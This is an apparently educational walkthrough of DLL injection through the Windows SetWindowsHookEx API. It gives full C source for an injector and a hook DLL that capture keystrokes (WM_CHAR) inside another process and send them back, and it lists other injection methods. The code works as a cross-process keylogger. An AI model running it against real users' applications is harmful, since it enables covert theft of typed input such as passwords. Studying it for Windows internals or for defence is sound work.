https://www.youtube.com/watch?v=uHuEgnQ1a2c

**Audience:**  
These notes are for experienced Windows engineers familiar with Win32 APIs, process/thread concepts, message loops, and dynamic link libraries (DLLs). We will explore how to leverage the `SetWindowsHookEx` API to inject a DLL into a target GUI thread and monitor or manipulate its messages, focusing on keyboard input as an example.

---
## Overview
**Goal:**  
Use `SetWindowsHookEx` to inject a DLL into another process’s GUI thread. This technique:
- Forces the target thread to load our DLL.
- Allows us to intercept messages (e.g., keyboard input) before they reach the target window.
- Enables us to send data back to our controlling (injector) process.
**Key Points:**
- `SetWindowsHookEx` installs a hook procedure defined in a DLL into the address space of the target thread.
- This works only if the target process uses `user32.dll` and has a message loop (GUI thread).
- Hooks are associated with specific hook types (e.g., `WH_GETMESSAGE` to intercept posted messages).

---
## Internals of `SetWindowsHookEx`

- **Concept:**
  Hooks chain multiple procedures that receive events before they reach the intended window procedure.
- **Hook Types:**
  Common hook types include:
  - `WH_GETMESSAGE`: Intercept messages retrieved by `GetMessage` or `PeekMessage`.
  - `WH_KEYBOARD` or `WH_KEYBOARD_LL`: Intercept keystrokes.
- **Address Space and Dll Loading:**
  When you call `SetWindowsHookEx` from one process and specify a DLL-based hook procedure, Windows arranges that the target thread’s next message retrieval triggers loading the DLL into the target process. The hook procedure then runs inside the target process's context.
- **Caveat:**
  The target process must be a GUI process (using `user32.dll`) and have a message queue. A console-only or headless process won’t support these hooks.
---
## Typical Steps to Inject a DLL via SetWindowsHookEx

1. **Identify Target Process and GUI Thread:**
   - Enumerate threads of the target process.
   - Find a GUI thread (one that has a message queue). Often the main thread of a GUI app.

2. **Load Your Injection DLL in the Injector Process:**
   - Call `LoadLibrary` on your DLL.
   - `GetProcAddress` to find the hook procedure and possibly a function to share state.

3. **Set the Hook:**
   - Call `SetWindowsHookEx` with the hook type (e.g., `WH_GETMESSAGE`), the hook procedure pointer, the DLL module handle, and the target thread ID.
   - This registers the hook and arranges the remote injection.

4. **Trigger Hook Loading:**
   - Post a dummy message to the target thread queue (e.g., `PostThreadMessage`) to ensure it processes messages and loads the DLL.

5. **Intercept and Forward Data:**
   - The hook procedure in the DLL runs in the target process. On certain messages (like `WM_CHAR`), it can call `PostThreadMessage` back to the injector’s thread, delivering keystrokes or other data.

6. **Cleanup:**
   - When done, call `UnhookWindowsHookEx` to remove the hook.
   - If desired, call `FreeLibrary` on the DLL from the injector process once hooks are removed and no longer needed.

---

## Detailed Code Example

We will have two components:

1. **Injector (EXE)**:  
   - Finds target GUI thread.
   - Loads the injection DLL in its own space and gets function pointers.
   - Calls `SetWindowsHookEx`.
   - Runs a message loop to receive data from the injected DLL.

2. **Injected DLL**:  
   - Implements the hook procedure.
   - Optionally exports a function to set the injector’s thread ID for callbacks.
   - Uses shared memory or a shared data segment if needed.
   - On receiving messages in the hook proc (e.g., `WM_CHAR`), posts them to the injector thread.

### Injector Code Sketch

```c
// Injector.cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

static DWORD FindUIThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te = { sizeof(te) };
    DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                // Check if this thread is GUI capable using GetGUIThreadInfo
                GUITHREADINFO gti = { sizeof(gti) };
                if (GetGUIThreadInfo(te.th32ThreadID, &gti)) {
                    tid = te.th32ThreadID;
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: Injector <PID>\n");
        return 1;
    }

    DWORD pid = _wtoi(argv[1]);
    DWORD tid = FindUIThread(pid);
    if (!tid) {
        wprintf(L"No GUI thread found in PID %u.\n", pid);
        return 1;
    }

    // Load the DLL
    HMODULE hDll = LoadLibrary(L"injected.dll");
    if (!hDll) {
        wprintf(L"Failed to load injected.dll\n");
        return 1;
    }

    // Get hook function pointer
    typedef LRESULT (CALLBACK *HOOKPROC)(int code, WPARAM wParam, LPARAM lParam);
    HOOKPROC HookFunc = (HOOKPROC)GetProcAddress(hDll, "HookFunc");
    if (!HookFunc) {
        wprintf(L"HookFunc not found\n");
        return 1;
    }

    // Get SetNotify function pointer
    typedef void (CALLBACK *SETNOTIFY)(DWORD);
    SETNOTIFY SetNotifyTID = (SETNOTIFY)GetProcAddress(hDll, "SetNotifyTID");
    if (!SetNotifyTID) {
        wprintf(L"SetNotifyTID not found\n");
        return 1;
    }

    // Tell the DLL the thread ID of this injector, so it can post messages back
    DWORD myTID = GetCurrentThreadId();
    SetNotifyTID(myTID);

    // Install the hook
    HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, HookFunc, hDll, tid);
    if (!hHook) {
        wprintf(L"SetWindowsHookEx failed\n");
        return 1;
    }

    // Force a message to load the DLL in target
    PostThreadMessage(tid, WM_NULL, 0, 0);

    // Message loop to receive chars from DLL
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_APP) {
            // Received a character
            wchar_t ch = (wchar_t)msg.wParam;
            if (ch == L'\r') wprintf(L"\n");
            else wprintf(L"%c", ch);
        }
        else if (msg.message == WM_QUIT) {
            break;
        }
        // TranslateMessage & DispatchMessage if needed
    }

    // Cleanup
    UnhookWindowsHookEx(hHook);
    FreeLibrary(hDll);

    return 0;
}
```

### Injected DLL Code Sketch

```c
// injected.cpp
#include <windows.h>

#pragma data_seg(".shared")
static DWORD g_NotifyTID = 0; // Shared across processes due to linker directives
#pragma data_seg()

#pragma comment(linker, "/SECTION:.shared,RWS")

// Hook procedure
extern "C" __declspec(dllexport)
LRESULT CALLBACK HookFunc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        MSG* pMsg = (MSG*)lParam;
        if (pMsg->message == WM_CHAR && g_NotifyTID != 0) {
            // Forward character to injector
            PostThreadMessage(g_NotifyTID, WM_APP, pMsg->wParam, pMsg->lParam);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

// Set the notify thread ID
extern "C" __declspec(dllexport)
void CALLBACK SetNotifyTID(DWORD tid) {
    g_NotifyTID = tid;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_DETACH) {
        // If we want, we can notify that target is shutting down
        if (g_NotifyTID != 0) {
            PostThreadMessage(g_NotifyTID, WM_QUIT, 0, 0);
        }
    }
    return TRUE;
}
```

**What’s Happening?**
- The DLL uses a shared section (`.shared`) so `g_NotifyTID` remains consistent across injector and target.
- Actually, `g_NotifyTID` is shared among all processes that load the DLL. Since it’s a hook DLL, both injector and target see the same `g_NotifyTID`.
- The hook function intercepts `WM_CHAR` messages, forwarding characters to the injector thread via `PostThreadMessage`.

---

## Internals and Considerations

- **User32 and Win32k:**
  `SetWindowsHookEx` calls into user32, which communicates with the kernel (win32k.sys) to register the hook. The kernel sets up structures so that next time the target thread retrieves a message, it loads the DLL.

- **Address Space Differences:**
  The DLL is mapped into both the injector and target processes. Shared sections (RWS) allow sharing data (e.g. `g_NotifyTID`) across these processes.

- **Message Flow:**
  For every message the target thread fetches with `GetMessage` or `PeekMessage`, the hook chain is called. Your hook function can inspect/modify the message or block it.

- **Limitations:**
  - Hooks only work if the target process has a message loop and user32 loaded.
  - Some apps with no UI or that run on different desktops will not work.
  - Hooks are global to the thread’s desktop, so be mindful about isolating your scenario.

- **Performance Impacts:**
  Hooks slow down message retrieval. Installing many hooks or complex hook functions can degrade UI responsiveness.

- **Security and Permissions:**
  Normally must run at similar or higher privileges than the target. On Vista+ with session isolation and UIPI, hooking can fail if crossing integrity levels.

---

## Alternative Approaches

- **CreateRemoteThread + LoadLibrary**: Another classic DLL injection method that works even for non-GUI processes.
- **QueueUserAPC**: Insert an APC to the target thread and call `LoadLibrary`.
- **NtQueueApcThread / Low-level Syscalls**: More advanced and undocumented.

For GUI tasks specifically, `SetWindowsHookEx` is elegant since it piggybacks on the message loop mechanism.

---

## Summary

Using `SetWindowsHookEx` for DLL injection:

- Identify target GUI thread.
- Load your DLL locally, find hook function and helper functions.
- Register the hook with `SetWindowsHookEx`.
- Trigger message processing in target to load the DLL.
- Hook procedure runs in target process, intercepting messages (like keystrokes).
- Communicate back to injector via inter-process messaging (or other IPC).
- Cleanup with `UnhookWindowsHookEx`.

This method relies on the target’s UI infrastructure and message loop, making it specialized for tasks like logging keystrokes or filtering messages in GUI applications.
```